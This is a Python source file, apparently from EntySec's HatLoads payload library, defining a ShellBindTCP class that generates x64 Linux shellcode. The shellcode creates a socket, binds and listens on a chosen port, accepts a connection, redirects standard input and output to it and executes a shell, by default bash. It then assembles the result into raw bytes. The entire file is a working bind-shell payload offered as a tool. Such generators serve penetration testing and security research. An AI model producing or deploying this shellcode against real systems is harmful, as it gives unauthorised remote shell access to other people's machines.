#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.consts import Consts


class ShellBindTCP(HatAsm, HatVenom, Consts):
    def generate(self, assemble=True, options={}):
        if 'BPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL']
        else:
            shell = self.shells['bash']

        bport = self.convert_port(options['BPORT'])

        shellcode = f"""
        start:
            push 0x29
            pop rax
            cdq
            push 0x2
            pop rdi
            push 0x1
            pop rsi
            syscall

            xchg rdi, rax
            push rdx
            mov dword ptr [rsp], 0x{bport.hex()}0002
            mov rsi, rsp
            push 0x10
            pop rdx
            push 0x31
            pop rax
            syscall

            push 0x32
            pop rax
            syscall

            xor rsi, rsi
            push 0x2b
            pop rax
            syscall

            xchg rdi, rax
            push 0x3
            pop rsi

        dup:
            dec rsi
            push 0x21
            pop rax
            syscall

            jne dup
            push 0x3b
            pop rax
            cdq
            movabs rbx, 0x{shell.hex()}
            push rbx
            mov rdi, rsp
            push rdx
            push rdi
            mov rsi, rsp
            syscall
        """

        if assemble:
            return self.assemble('x64', shellcode)
        return shellcode
